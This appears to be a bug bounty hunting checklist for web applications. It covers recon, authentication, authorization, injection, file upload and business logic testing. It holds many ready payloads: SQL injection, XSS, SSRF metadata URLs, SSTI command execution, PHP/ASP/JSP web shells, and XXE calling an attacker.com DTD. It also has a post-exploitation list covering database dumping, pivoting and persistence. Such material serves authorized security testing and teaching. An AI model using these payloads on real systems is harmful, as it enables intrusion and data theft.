# 🔥 **ULTIMATE DEEP MANUAL BUG HUNTING CHECKLIST**  
*Everything You Need to Find Critical Bugs (Guaranteed)*

---

## 🎯 **PART 1: PRE-HUNT PREPARATION (Most Skip This)**

### **🟢 Target Intelligence Gathering**
```
✅ Company research (tech stack, recent breaches, acquisitions)
✅ Employee LinkedIn (tech roles, devs, admins)
✅ GitHub reconnaissance (employee repos, API keys, config files)
✅ Stack Overflow (dev questions about target's tech)
✅ SSL certificates (subdomains via certificate transparency)
✅ Shodan/Censys (exposed services, ports, versions)
✅ BuiltWith/Wappalyzer (exact technology stack)
```

### **🟢 Asset Discovery (Beyond Basic)**
```
✅ Subdomain enumeration (5+ tools for completeness):
   - subfinder + amass + assetfinder + findomain + chaos
✅ Virtual host discovery (ffuf with vhosts wordlist)
✅ Cloud assets:
   - AWS S3 buckets (target.s3.amazonaws.com)
   - Azure blobs, Google Cloud Storage
   - DigitalOcean Spaces, Cloudflare R2
✅ Mobile apps (APK/IPA analysis for API endpoints)
✅ Email servers (MX records, mail.* subdomains)
```

---

## 🔥 **PART 2: ULTIMATE RECON CHECKLIST**

### **🟢 JavaScript Analysis (Deep Dive)**
```
1. Download ALL JS files:
   - LinkFinder, JSFScan, getJS
   - Burp's JS Miner extension

2. Manual JS Grepping:
   grep -r "password\|token\|secret\|key\|auth\|admin\|api\|endpoint\|url\|config"
   
3. Deobfuscate packed JS:
   - js-beautify, JStillery
   - Manual analysis of minified code

4. API Endpoint Extraction:
   - Look for fetch(), axios(), $.ajax()
   - WebSocket connections (ws://, wss://)
   - GraphQL endpoints (/graphql, /graphiql)

5. Source Map Analysis:
   - Check for *.js.map files
   - Extract original source code with variable names
```

### **🟢 Hidden Paths & Files (Complete List)**
```bash
# Environment Files:
/.env
/.env.local
/.env.production
/.env.development
/config/.env
/app/.env

# Version Control:
/.git/
/.git/config
/.git/HEAD
/.svn/
/.hg/

# Backup Files:
/backup/
/backup.zip
/backup.tar.gz
/database.sql
/dump.sql
/backup_2024.sql

# Configuration:
/config.json
/configuration.json
/settings.json
/app/config.json
/api/config.json

# Debug & Admin:
/phpinfo.php
/info.php
/test.php
/debug.php
/adminer.php
/phpMyAdmin/
/web-console
/actuator/health
/actuator/env

# Temporary/Upload:
/tmp/
/temp/
/uploads/
/files/
/storage/
/static/

# API Documentation:
/swagger/
/swagger-ui/
/api-docs/
/redoc/
/openapi.json
```

### **🟢 Parameter Discovery (Beyond URL Params)**
```
✅ Hidden JSON parameters in POST requests
✅ GraphQL introspection queries
✅ WebSocket message parameters
✅ Multipart form-data hidden fields
✅ HTTP header parameters (X-Forwarded-*, Custom headers)
✅ Cookie parameters
✅ JWT token claims manipulation
```

---

## 🔥 **PART 3: AUTHENTICATION DEEP DIVE**

### **🟢 Registration Flow Attacks**
```
1. Email Duplication Bypass:
   - Register with victim@target.com
   - Use victim@target.com (with space)
   - Use victim@target.com. (extra dot)
   - Unicode homograph attacks

2. Username Squatting:
   - admin, administrator, root, superuser
   - test, demo, staging
   - Reserved names by system

3. Account Verification Bypass:
   - Direct access to verified state
   - Replay verification request
   - Change verified=true in response
```

### **🟢 Login Attacks (Complete List)**
```
✅ Username Enumeration:
   - Different error messages
   - Response timing differences
   - Password reset feature leakage

✅ Password Spraying:
   - Common passwords across many users
   - Don't lock any single account

✅ 2FA/MFA Bypass:
   - Response manipulation (skip 2FA)
   - Code reuse (000000, 123456)
   - Time-based prediction
   - Brute force (if no rate limit)
   - Bypass via parallel session
   - Backup code abuse

✅ Remember Me Attacks:
   - Decode remember me token
   - Predictable token generation
   - Token never expires
```

### **🟢 Password Reset/Change Attacks**
```
1. Token in Response:
   - Check response body, headers, redirect URL

2. Token Predictability:
   - Time-based (epoch time)
   - User ID based (MD5(user_id))
   - Sequential tokens

3. Host Header Injection:
   - Host: attacker.com
   - X-Forwarded-Host: attacker.com

4. Parameter Pollution:
   - email=victim@target.com&email=attacker@target.com
   - email[]=victim&email[]=attacker

5. Account Takeover via Response Manipulation:
   - Change success response to auto-login
```

### **🟢 Session Management Deep Checks**
```
✅ JWT Attacks:
   - alg:none
   - RS256 to HS256
   - Kid manipulation (path traversal, SQLi)
   - JWK/JWKx injection

✅ Session Fixation:
   - Set session cookie before login
   - Session carries over post-login

✅ Concurrent Sessions:
   - Multiple active sessions allowed?
   - Can old sessions be invalidated?

✅ Cookie Analysis:
   - Base64 decode all cookies
   - Look for serialized PHP objects
   - Check for user info in cookies
```

---

## 🔥 **PART 4: AUTHORIZATION MASTER CHECKLIST**

### **🟢 IDOR/IDOA (Every Possible Variation)**
```http
# Direct Object Reference:
/user/{id} → /user/{other_id}
/order/{num} → /order/{other_num}
/invoice/{uuid} → /invoice/{other_uuid}

# Indirect Reference (more common):
GET /api/user/me/orders → returns user_id in response
POST /api/update-profile → contains user_id in JSON
GET /download?file=user123_report.pdf

# Mass Assignment IDOR:
POST /api/users
{
  "name": "attacker",
  "role": "admin",        # Try adding
  "user_id": "victim123"  # Try changing
}

# HTTP Method Based:
GET /admin → 403
POST /admin → 200 ?
PUT /admin → 200 ?
```

### **🟢 Horizontal Privilege Escalation**
```
1. User A can access User B's:
   - Profile data
   - Messages
   - Orders
   - Files
   - Payment methods
   - API keys

2. Parameter Tampering:
   - user_id=attacker → user_id=victim
   - account_id=1001 → account_id=1002
   - company_id=501 → company_id=502
```

### **🟢 Vertical Privilege Escalation (Admin Access)**
```
# Direct Admin Paths:
/admin
/administrator
/dashboard
/manager
/console
/cp
/backend
/controlpanel

# API Admin Endpoints:
/api/admin
/api/v1/admin
/api/internal
/rest/admin
/graphql (admin queries)

# Headers to Add:
X-Admin: true
X-Role: administrator
X-User-Type: admin
isAdmin: 1

# Cookie Manipulation:
role=admin
is_admin=true
user_type=administrator
permissions=all

# JWT Claim Injection:
{
  "user": "attacker",
  "role": "admin",          # Add this
  "isAdmin": true,          # Or this
  "scopes": ["read", "write", "admin"]
}
```

### **🟢 Function Level Authorization**
```
# User functions trying as Admin:
- Delete user
- Ban user
- Edit site settings
- View audit logs
- Access payment gateway
- Export all data

# Business Logic Bypass:
1. Purchase without payment:
   - Skip to /checkout/success
   - status=paid parameter
   - payment_id=valid_id_from_other_user

2. Unlimited resources:
   - Remove limits in request
   - quantity=999999
   - Set expiry to far future
```

---

## 🔥 **PART 5: INPUT VALIDATION DEEP CHECKS**

### **🟢 SQL Injection (Beyond Basic)**
```
# Time-Based Blind:
' AND SLEEP(5)--
' AND BENCHMARK(1000000,MD5('a'))--

# Out-of-Band:
' UNION SELECT LOAD_FILE('\\\\attacker\\share\\test.txt')--
' UNION SELECT INTO OUTFILE '/var/www/html/shell.php'--

# Second-Order SQLi:
Register username: admin'--
Later: Update profile triggers injection

# NoSQL Injection:
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}

# ORM Injection:
User.where("name = '#{params[:name]}'")
Becomes: ') OR 1=1--
```

### **🟢 XSS (All Contexts)**
```
# HTML Context:
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# JavaScript Context:
</script><script>alert(1)</script>
'-alert(1)-'
';alert(1)//

# Attribute Context:
" onmouseover="alert(1)
' autofocus onfocus=alert(1) //

# DOM XSS Sinks:
document.write()
innerHTML
eval()
setTimeout()
location.href
postMessage()

# Advanced Payloads:
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext></mtext><mglyph></mglyph></math>
```

### **🟢 SSRF (Server-Side Request Forgery)**
```
# URL Schemes:
http://169.254.169.254/latest/meta-data/
http://localhost:22
http://[::1]:6379
gopher://, dict://, file://

# Bypass Techniques:
localhost → 127.0.0.1 → 2130706433 (decimal)
localhost → 0.0.0.0 → 0 (short)
Use @: http://example.com@localhost
Use #: http://localhost#@example.com
Use DNS rebinding
```

### **🟢 XXE (XML External Entity)**
```xml
# Basic:
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<test>&xxe;</test>

# Out-of-Band:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;

# SVG XXE:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg>&xxe;</svg>
```

### **🟢 SSTI (Server-Side Template Injection)**
```
# Identify Template Engine:
{{7*7}} → 49 (Twig/Jinja2)
${7*7} → 49 (Spring)
<%= 7*7 %> → 49 (ERB)
#{7*7} → 49 (Play)
*{7*7} → 49 (Thymeleaf)

# RCE Payloads:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%= system("id") %>
```

---

## 🔥 **PART 6: FILE UPLOAD COMPLETE ATTACKS**

### **🟢 File Type Bypass Matrix**
```
Original: shell.php
Try:
- shell.php.jpg
- shell.php%00.jpg
- shell.php.
- shell.pHp
- shell.php;.jpg
- shell.php%0d%0a.jpg
- shell.png.php
- .htaccess with AddType
```

### **🟢 Dangerous File Uploads**
```
# PHP:
<?php system($_GET['cmd']); ?>
<?=`$_GET[0]`?>

# ASP:
<% eval request("cmd") %>

# JSP:
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# SVG (XSS + XXE):
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

# HTML (XSS):
<html><script>alert(document.domain)</script></html>

# CSV (Formula Injection):
=cmd|' /C calc'!A0
```

### **🟢 Zip Upload Attacks**
```
# Zip Slip:
../../../etc/passwd

# Zip Symlink:
ln -s /etc/passwd link
zip --symlink evil.zip link

# Password Protected Zip Bypass
```

---

## 🔥 **PART 7: BUSINESS LOGIC DEEP CHECKS**

### **🟢 Pricing & Payment Flaws**
```
1. Negative Pricing:
   price=-100
   quantity=-10
   discount=150 (more than price)

2. Race Conditions:
   - Parallel requests for limited stock
   - Double spend attacks
   - Referral code spam

3. Coupon Abuse:
   - Reuse single-use coupons
   - Apply expired coupons
   - Stack multiple coupons
   - Negative coupon values
   - Apply to excluded items

4. Payment Bypass:
   - Skip to success URL
   - Fake payment callback
   - Reuse payment ID
   - Modify payment status
```

### **🟢 Inventory & Stock Manipulation**
```
# Negative Stock:
quantity=-999
# Leads to: stock = stock - (-999) = stock + 999

# Oversell:
Add more than available to cart
Checkout anyway

# Price Bypass:
Modify price in cart localStorage
Intercept and modify price in request
```

### **🟢 Workflow Bypasses**
```
1. Skip Steps:
   /checkout/step1 → /checkout/step3
   Add ?completed=true

2. State Manipulation:
   status=approved
   verified=true
   paid=yes

3. Timing Attacks:
   Change dates (expiry, start dates)
   Use timezone manipulation
```

---

## 🔥 **PART 8: API DEEP TESTING**

### **🟢 REST API Checks**
```
✅ Missing Authentication on API endpoints
✅ Excessive Data Exposure (returns entire object)
✅ Mass Assignment (add admin:true)
✅ Rate Limiting Bypass
✅ Verb Tampering (GET vs POST vs PUT)
✅ Path Traversal in API parameters
✅ GraphQL-specific:
   - Introspection enabled
   - Field duplication DoS
   - Deep query recursion
```

### **🟢 WebSocket Testing**
```
1. Authentication Bypass:
   - Connect without auth token
   - Reuse old token

2. Message Tampering:
   - Modify messages in transit
   - Replay messages

3. Subscription Attacks:
   - Subscribe to other users' channels
   - Subscribe to admin channels
```

---

## 🔥 **PART 9: CONFIGURATION & MISCONFIGURATION**

### **🟢 Server Misconfig**
```
✅ Directory listing enabled
✅ Verbose error messages
✅ Default files/credentials
✅ HTTP methods (OPTIONS, TRACE)
✅ CORS misconfiguration
✅ HSTS missing
✅ Clickjacking protection missing
```

### **🟢 Cloud & Container Issues**
```
✅ AWS S3 bucket permissions
✅ Kubernetes API exposed
✅ Docker registry exposed
✅ Redis/Memcached without auth
✅ Elasticsearch without auth
✅ MongoDB without auth
```

---

## 🔥 **PART 10: ADVANCED CHAINING ATTACKS**

### **🟢 Attack Chains (High Impact)**
```
1. XSS → Steal Admin Cookie → Admin Access
2. IDOR → Leak User Data → Account Takeover
3. SSRF → Access Metadata → Cloud Takeover
4. File Upload → Web Shell → RCE
5. Business Logic → Free Purchases → Resell Goods
```

### **🟢 Post-Exploitation**
```
Once you have access:
1. Dump database via SQLi
2. Extract source code via LFI
3. Access internal networks via SSRF
4. Pivot to other systems
5. Maintain persistence
```

---

## 🔥 **DAILY WORKFLOW (EXECUTION PLAN)**

### **🟢 Morning (2 hours)**
```
1. Fresh target selection
2. Complete reconnaissance
3. Map all functionality
4. Note all input points
```

### **🟢 Afternoon (3 hours)**
```
1. Test authentication flows
2. Test authorization (IDOR, privilege)
3. Test business logic
4. Test file uploads
```

### **🟢 Evening (2 hours)**
```
1. Test input validation (XSS, SQLi, etc.)
2. Check configurations
3. Document findings
4. Plan next day
```

---

## 🔥 **PRO TIPS FOR MAXIMUM FINDINGS**

### **🟢 Mindset Tips**
```
1. Think "How can I break this?" not "What vulnerabilities exist?"
2. Assume every input is vulnerable until proven otherwise
3. Test edge cases (negative values, huge values, special chars)
4. Chain small issues into critical ones
```

### **🟢 Technical Tips**
```
1. Use Burp's "Search" feature extensively
2. Automate repetitive tests with macros
3. Save interesting requests in notes
4. Re-test after fixes (regression testing)
```

### **🟢 Reporting Tips**
```
1. Clear reproduction steps
2. Impact analysis (business perspective)
3. Suggested fixes (developer-friendly)
4. Video proof (screen recording)
```

---

## 🔥 **TOOLS YOU MUST MASTER**

### **🟢 Recon**
```
- Amass, Subfinder, Assetfinder
- Gau, WayBackUrls
- FFuf, Dirsearch
- Nuclei (for quick wins)
```

### **🟢 Proxy & Analysis**
```
- Burp Suite Professional (must have)
- OWASP ZAP
- Postman for API testing
- Browser DevTools
```

### **🟢 Exploitation**
```
- Sqlmap (advanced features)
- Commix
- XSStrike
- SSRFmap
```

### **🟢 Custom Scripts**
```
Learn to write Python scripts for:
- Automating repetitive tests
- Parsing responses
- Generating payloads
```

---

## 📊 **PRIORITY MATRIX (What to Test First)**

```
CRITICAL (Test Immediately):
1. Authentication bypass
2. Payment bypass
3. Admin access
4. RCE/File upload to shell
5. Database access

HIGH (Test After Critical):
1. IDOR accessing other users' data
2. Business logic money loss
3. SSRF to internal services
4. SQL injection
5. Account takeover

MEDIUM (Test Later):
1. XSS (context dependent)
2. CSRF with impact
3. Information disclosure
4. Rate limit bypass

LOW (Test Last):
1. Security headers
2. Cookie flags
3. Clickjacking
4. Directory listing
```

---

## 🎯 **FINAL ADVICE**

**Remember:** Quality over quantity. One well-documented critical bug is better than 100 low-severity findings.

**Always:**
- Stay within scope
- Respect rate limits
- Don't damage production data
- Report responsibly
- Keep learning new techniques

**Your Success Formula:**
```
Deep Recon + Understanding Business Logic + 
Systematic Testing + Creative Thinking = 
HIGH VALUE BUGS
```

---

**Save this checklist. Refer to it daily. Add your own findings. Evolve it.**

*Happy Hunting! May you find critical bugs in every target! 🚀*
